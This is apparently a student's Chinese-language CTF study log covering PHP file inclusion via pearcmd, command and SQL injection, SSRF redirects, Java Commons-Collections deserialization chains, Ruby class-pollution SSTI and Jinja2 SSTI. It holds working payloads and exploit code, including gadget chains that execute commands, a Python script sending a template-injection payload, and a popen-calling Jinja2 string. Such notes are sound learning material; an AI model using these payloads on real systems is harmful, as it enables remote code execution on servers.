---
title: 刷题记录
---

# 24-12-07

## php-cms-study

```nginx
if (!-e $request_filename){
    rewrite  ^(.*)$  /index.php?s=$1  last;   break;
}
```

伪静态规则，将uri参数传入php。

cms内部通过**特定的路由规则**找到对应的控制器(Controller)，Controller执行对应的函数。

1.路由规则可以通过在控制器下断点，通过调试，找到父级函数层层寻找规则。

2.或者直接从入口index.php开始一层层寻找



CTF：重点关注api,controller等处理请求的文件。


------


## pearcmd

[register_argc_argv与include to RCE的巧妙组合 - Longlone's Blog](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合/#)

[Docker PHP裸文件本地包含综述 | 离别歌](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)

// config-create可以直接创建配置文件，且第一个参数必须以/开头 

`http://ip:port/include.php?f=pearcmd&+config-create+/<?=phpinfo();?>+/tmp/evil.php`

[关于pearcmd.php的利用 - Yuy0ung - 博客园](https://www.cnblogs.com/yuy0ung/articles/18220835)

```
可以看见在config-create前面存在一个加号，这使得数组的第一个键为空，经验证，去掉这个加号后，payload就失效了，这里引发了笔者思考：为何要加这个空键呢？

事实上，在pearcmd.php中，在分析存储$_SERVER[‘argv’]所有参数的数组$argv时，直接对argv[1]进行分析而不是argv[0]（在本文第一个代码块中可以看见）

笔者认为，这里对payload进行构造时，重点在于将要调用的pear命令控制在数组的第二位，而剩下两个参数遵循当前pear命令的先后放入数组即可（对比本文所有payload均遵循这个构造原则）

观点仅代表个人，欢迎斧正（本人技术不够）
```



Todo:

- [ ] 去看看pearcmd.php的源码
- [ ] 去看看config create创建出的源码
- [ ] 仔细理解exp里面为什么要加/要加&要加+等

------


## php-fpm

[PHP-FPM攻击详解 - 跳跳糖](https://tttang.com/archive/1775/)

[Nginx（IIS7）解析漏洞](https://tttang.com/archive/1775/#toc_nginxiis7)

正常来说，SCRIPT_FILENAME的值是一个不存在的文件/var/www/html/favicon.ico/.php，是PHP设置中的一个选项fix_pathinfo导致了这个漏洞。PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，fpm会判断SCRIPT_FILENAME是否存在，如果不存在则去掉最后一个/及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。

------ 
 

# 24-12-08

## buuoj 刷题
### [HCTF 2018]WarmUp

payload：hint.php?/../../../../ffffllllaaaagggg

这个uri**把hint.php?当作一个文件夹名字**了，所以可路径穿越到根目录。

[复习下include和require的区别](https://www.runoob.com/w3cnote/php-different-include-and-require.html)

### [ACTF2020 新生赛]Include

PHP文件包含：PHP伪协议的使用。

`php://filter/read=convert.base64-encode/resource=flag.php`

[PHP伪协议总结 - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000018991087)

> boogipop：或者包含日志文件，然后蚁剑连接！！！
> 所以我们可以通过请求往日志里写脏东西

### [ACTF2020 新生赛]Exec

猜测源码为`exec(ping $input)`

`;cat /flag;`可执行命令。

注意代码执行函数和命令执行函数不同，一个执行php'代码，一个执行外部linux命令

[PHP中的代码执行，命令执行与常见bypass技巧 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/359345.html)

### [SUCTF 2019]EasySQL

这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用

 

解法1

输入的内容为*,1

内置的sql语句为sql="select".sql="select".post[‘query’]."||flag from Flag";

如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容

### [极客大挑战 2019]EasySQL

`username=\&password=or 1='1`或者 `a' or 1=1 #`

## [ImaginaryCTF24]readme2

官解是通过host覆盖url进行绕过，以及\t的解析，我也不知道为什么。。。

找到一篇文章，介绍了重定向的方法。[this](https://www.ctfiot.com/192407.html)

Searching around, I discovered this [article](https://mizu.re/post/proxifier) by Mizu. Reading through the writeup, the payload that he used was \\127.0.0.1\a. When I put \\google.com it redirected to official Google website.

At first, I got no clue for the next steps. But, thanks to @vicevirus hints the solution would be to utilize fetch() redirection.

For this, we may need to setup a HTTP server that will redirect to http://localhost:3000/flag.txt

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return redirect("http://localhost:3000/flag.txt")	

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
```

``` Http
GET //ip:port
Host: xxx
```

补充：(MDN官方URL的例子）[https://developer.mozilla.org/en-US/docs/Web/API/URL/URL#examples]
``` js
new URL("//foo.com", "https://example.com");
// => 'https://foo.com/' (see relative URLs)
``` 
 

# [安洵杯 2019]easy_serialize_php

php反序列化，初看以为可控参数只有`$_SESSION['function'] = $function;`，而且又要用于下面的参数show_image反序列化判断，于是不知道怎么办了。

看完解析后发现了`extract($_POST);`，可以将POST数组的内容解包开。所以我们可以直接上传$_SESSION的数值。

最后有趣的一点：读取do0g.php文件时，返回的内容是`<?php`开头的源文件，浏览器却没有显示任何内容，导致我以为哪里出错了。

后来知道，<?被浏览器解析为了注释字符，不渲染。`<? ... ?>` 默认被当作注释

我将起诉我的浏览器和hackbar，从而转向yakit进行收发包！！！！！！！！！！

 
 

# [强网拟态23] web noumisotuitennnoka

[Bug](https://bugs.php.net/bug.php?id=72374)  #72374   ZipArchive::addGlob remove_path option strips first char of filename 

注意到源码中：

```php
$zip->addGlob($jsonDir . '/**', 0, ['add_path' => 'var/www/html/', 'remove_path' => $dev_dir]);
$zip->addGlob($jsonDir . '/.htaccess', 0, ['add_path' => 'var/www/html/', 'remove_path' => $dev_dir]);
```

我们令`subdir = /a (路径名只能为一个字母)`

则我们添加的文件名为`/tmp/a/** `

根据bug可知，当我们的remove_path为`/tmp/`时，文件名会多吃掉一个字母a，从而导致我们的文件解压到/var/www/html目录下，这个时候我们直接用clean删除.htaccess文件就能访问后门文件。
 
 

# java反序列化

重新学习了cc1, cc6

重点理解了cc1，cc6的入口，和如何把Runtime变成Runtime.class进行序列化

```java
InvokerTransformer it0 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
InvokerTransformer it1 = new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null});
InvokerTransformer it2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"});
Method getRuntimeMethod = (Method) it0.transform(Runtime.class);
Runtime runtime = (Runtime) it1.transform(getRuntimeMethod);
it2.transform(runtime);
// 最后三行等价于
it2.transform(it1.transform(it0.transform(Runtime.class)));
// 太麻烦，可用ChainedTransformer辅助
```

cc1的`TransformedMap`和`LazyMap`两种方式

```java
public static void TransformedMap(String[] args) throws Exception {
    // 目前有三个亟待解决的问题
    // ①：Runtime 对象不可序列化，需要通过反射将其变成可以序列化的形式。
    // ②：setValue() 的传参，是需要传 Runtime 对象的；而在实际情况当中的 setValue() 的传参是不可控的一坨
    // ③：解决上文提到的，要进入 setValue 的两个 if 判断

//        Class c = Runtime.class;
//        Method method = c.getMethod("getRuntime");
//        Runtime runtime = (Runtime) method.invoke(null, null);
//        Method run = c.getMethod("exec", String.class);
//        run.invoke(runtime, "calc");

//        InvokerTransformer it0 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
//        InvokerTransformer it1 = new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null});
//        InvokerTransformer it2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"});
//        Method getRuntimeMethod = (Method) it0.transform(Runtime.class);
//        Runtime runtime = (Runtime) it1.transform(getRuntimeMethod);
//        it2.transform(runtime);

    // use ChainedTranformer
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class), //  不需要给transform传特定的Runtime.class，传什么都可以
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
//        };
//        ChainedTransformer c = new ChainedTransformer(transformers);
//        c.transform(null);

    // final exp
    // try to pass two if condition
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class), //  不需要给transform传特定的Runtime.class，传什么都可以
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    HashMap<Object, Object> map = new HashMap<>();
    map.put("value","bbb"); // 随便put点东西不然这个for (Map.Entry<String, Object> memberValue : memberValues.entrySet())就进不去了
    // String name = memberValue.getKey(); 要求键名为Target的成员变量名
    Map<Object, Object> evilMap = TransformedMap.decorate(map, null, chainedTransformer);
    Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor iconstruct = c.getDeclaredConstructor(Class.class, Map.class);
    iconstruct.setAccessible(true);
    // iconstruct.newInstance(Override.class, evilMap);
    // type, which is Override, has not member.
    // so we try another Class Target, which has single member named value (ElementType[] value();)
    Object o = iconstruct.newInstance(Target.class, evilMap);
    unserialize(serialize(o));
}
```

```java
public static void LazyMap(String[] args) throws Exception {
    Transformer[] transformers = {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    HashMap<Object, Object> hashMap = new HashMap<>();
    hashMap.put("hello", "world");
    Map evilmap = LazyMap.decorate(hashMap, chainedTransformer);

    // LazyMap触发点
    // evilmap.get(1); // 随便get一个东西满足if (map.containsKey(key) == false)

    // AnnotationInvocationHandler 的invoke方法里(77 行) ： Object result = memberValues.get(member); 触发了get()方法
    // InvocationHandler需要用到动态代理的知识：
    // Proxy代理一个类,并且通过InvocationHandler.invoke调用所代理类的方法，所以我们要构建一个proxymap。

    Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    // getDeclaredConstructor 返回所有的构造器
    // getConstructor 只返回public的构造器
    Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, evilmap);

    // public static Object newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h) throws IllegalArgumentException
    // loader 所代理的类的ClassLoader； 所代理类的实现接口； 程序处理的类
    Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
    // 用evilmap的代理再次构造成可反序列化对象
    Object o = constructor.newInstance(Override.class, proxymap);

    Tools.unserialize(Tools.serialize(o));
}
```

cc6

```java
public static void study(String[] args) throws Exception {
    Transformer[] transformers;
    transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    HashMap<Object, Object> hashMap = new HashMap<>();
    Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key"); // 这是一个值为"key"的key
    HashMap<Object, Object> expMap = new HashMap<>();
    expMap.put(tiedMapEntry, "value");  // 等于put("key","value"),只不过"key"绑了个hashmap(lazymap)

    hashMap.remove("key"); // expMap和hashMap(lazyMap)不同,expMap有key而hashMap没有
    // if (map.containsKey(key) == false)
    // lazyMap没有就调用transformer

    Class c = lazyMap.getClass();
    Field f = c.getDeclaredField("factory");
    f.setAccessible(true);
    f.set(lazyMap, chainedTransformer);
    byte[] s = Tools.serialize(expMap);
    Tools.unserialize(s);
}
```

重新理解了W4terTransformer里链条的调用

```java
public static void main(String[] args) throws Exception {
    W4terInvokerTransformer it0 = new W4terInvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
    W4terInvokerTransformer it1 = new W4terInvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null});
    W4terInvokerTransformer it2 = new W4terInvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"});
    // it2.transform(it1.transform(it0.transform(Runtime.class)));
    W4terTransformingComparator comparator0 = new W4terTransformingComparator(it2, new W4terComparator());
    W4terTransformingComparator comparator1 = new W4terTransformingComparator(it1, comparator0);
    W4terTransformingComparator comparator2 = new W4terTransformingComparator(it0, comparator1);
    PriorityQueue queue = new PriorityQueue(2, new W4terComparator());
    queue.add(Runtime.class);
    queue.add(Runtime.class);
    Class c = queue.getClass();
    Field f = c.getDeclaredField("comparator");
    f.setAccessible(true);
    f.set(queue, comparator2);
    byte[] o = serialize(queue);
    unserialize(o);
}
```

 
 

# java反序列化
## TemplatesImpl学习
> TemplatesImpl#newTransformer() ->
> TemplatesImpl#getTransletInstance() ->
> TemplatesImpl#defineTransletClasses() ->
> TransletClassLoader#defineClass()
>
> [Java反序列化基础篇-05-类的动态加载 | Drunkbaby's Blog](https://drun1baby.top/2022/06/03/Java反序列化基础篇-05-类的动态加载/#6-TemplatesImpl-加载字节码)

[TemplatesImpl 利用](https://drun1baby.top/2022/06/20/Java反序列化Commons-Collections篇04-CC3链/#0x04-TemplatesImpl-利用)

```java
public class StudyLoadByteCode {
    public static void main(String[] args) throws Exception {
        // EvilTemplates 必须继承AbstractTranslet, 不然defineClass会报错
        byte[] code = Files.readAllBytes(Paths.get("cc1/target/classes/cc3/EvilTemplates.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "hello");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        templates.newTransformer();
    }
}
```

## cc2 TemplatesImpl版 复现

```java
public class ExpByTemplates {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("cc1/target/classes/cc3/EvilTemplates.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "hello");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        // templates.newTransformer();
        Transformer transformer = new InvokerTransformer("toString", new Class[0], new Class[0]);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(0);
        queue.add(1);

        setFieldValue(transformer, "iMethodName", "newTransformer");
        
        // 反射修改队列元素，以下两种方法都可以
        Field f = queue.getClass().getDeclaredField("queue");
        f.setAccessible(true);
        Object[] q = (Object[]) f.get(queue);
        q[0] = templates;
        q[1] = templates;
        // 或者
        Object[] q = new Object[]{templates, templates};
        Field f = queue.getClass().getDeclaredField("queue");
        f.setAccessible(true);
        f.set(queue, q);

        byte[] o = serialize(queue);
        unserialize(o);


    }
}
```



还有发现了一点：

cc2 链条必须要collections4而不是collections,因为这决定了TransformingComparator是不是Serializable。
 
 

上一次学习是24年12月13号，现在已经25年1月17号了。

从ciscn打完就开始忙活其他事情，紧接着就是期末考了，没办法没办法没办法，昨天刚期末考完，整个期末周长达两星期，包括没上课的一周和考试的一周，没办法没办法，两周连电脑都不需要打开，这就是期末周的魅力。

今天想看看能不能把ciscn的东西再看一下

---------------------------------


> 1-30补档，以下是上次1-17说要整理ciscn题目但忘记记录的ezruby

首先，关于环境配置。

由于WSL+windows上的IDEA要实现debug实在是不方便，需要远程端口转发，搞半天搞不明白，于是我直接在我的VMWare Station里的虚拟机里配ruby环境并下载了RubyMine。

由于VMWare Station的虚拟机启动一直很慢，所以我搜索得到：[Insanely slow loading of linux kernel image on VMWare player](https://superuser.com/questions/1787733/insanely-slow-loading-of-linux-kernel-image-on-vmware-player)

`bcdedit /set hypervisorlaunchtype off` 关掉hyper虚拟化即可。但是后果就是WSL2不能使用了，即docker-desktop没法用了。



OK，言归正传，我们看回ezruby。

[Ruby Class Pollution](https://book.hacktricks.wiki/zh/pentesting-web/deserialization/ruby-class-pollution.html#ruby-class-pollution)

其中的污染其他类是我们想要的，`subclasses`这个方法需要**至少3.1版本以上的ruby**才有，如果旧版本则没法完成旁类污染。

（最初我是用的ubuntu22.04自带apt下载的ruby，badly。所以我推荐最好的调试环境，来自tel，是VM+RubyMine+RVM）



接下来我们针对sinatra这个框架进行ssti。

```ruby
  get('/') do
    erb :hello
  end
```

这里erb模板引擎会渲染views/hello.erb



深入模板引擎代码就行研究，这里就需要用到debug了，同时我们自己随便写个hello.erb，防止中途报错。

这里会编译模板两次，一次是settings.templates['hello']，另一次是setting.templates['layouts']

传入的body不能含有h，于是只能污染layouts。最终得到payload如下：

```json
data = {
    "class": {
        "superclass": {
            "superclass": {
                "subclasses": {
                    "sample": {
                        "settings": {
                            "templates": {
                                "layout": ["<%= IO.popen('ls').readlines() %>", "", ""]
                            }
                        }
                    }
                }
            }
        }
    }
}
```

以下是tel的exp：

```python
import json
import requests

url = "http://192.168.214.128:8888/"

data = {
    "class": {
        "superclass": {
            "superclass": {
                "subclasses": {
                    "sample": {
                        "settings": {
                            "templates": {
                                # "layout": ["<%= print(system('id'.downcase)) %>", "", ""]
                                "layout": ["<%= IO.popen('ls').readlines() %>", "", ""]
                            }
                        }
                    }
                }
            }
        }
    }
}

for i in range(500):
    r = requests.post(url + "/merge", data=json.dumps(data),
                      headers={"Content-Type": "text/plain"})
    print(r.text)

r = requests.get(url)
print(r.text)
```
 
 

这段时间碰到好多SSTI的题目，其中jinja2的ssti的payload研究一下

春秋杯冬季赛easy_flask，西湖论剑的web1，都是flask的ssti

`{% XX %}`是控制语句， `{{ var }}`是变量。

`{% for a in [].__class__.__base__.__subclasses__() %}{% if a.__name__=='_wrap_close' %}{{ a.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ipconfig').read()") }}{% endif %}{%endfor%}`



copy_file [春秋杯冬季赛]

没做出来，学习一下：[春秋杯冬季赛2024-2025-WEB - EddieMurphy's blog](https://eddiemurphy89.github.io/2025/01/17/春秋杯冬季赛2024-2025/#day1-file-copy)

[PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)



**插一嘴PHP的CMS环境配置，在PHPStrom里面，服务器的主机名是nginx的vhost的server_name，即虚拟主机名字**

所以之前的docker连不到PHPStrom的xdebug是因为，nginx没设置默认的主机名为localhsot



pear和pecl都是安装php扩展的，一个分发php代码，一个分发c语言编译成的扩展，php的docker镜像都默认安装这俩。

docker-php-ext-enable安装php内置的编译的扩展，如mysqli等。

php文件包含有一种pearcmd文件包含，复习一下 
 
今天搭集群

**DHCP是什么**

**Linux的服务是什么，怎么操作**

**NFS是什么**

NFS（Network File System）网络文件系统是一种分布式文件系统协议

NFS允许不同计算机通过网络共享资源，特别是文件和目录，就像它们是本地存储的一部分一样。使用NFS的客户端可以挂载远程服务器上的文件系统，使得用户能够以透明的方式访问远程数据，实现跨多个系统的文件共享。

https://reintech.io/blog/setting-up-nfs-server-on-debian-12 
 

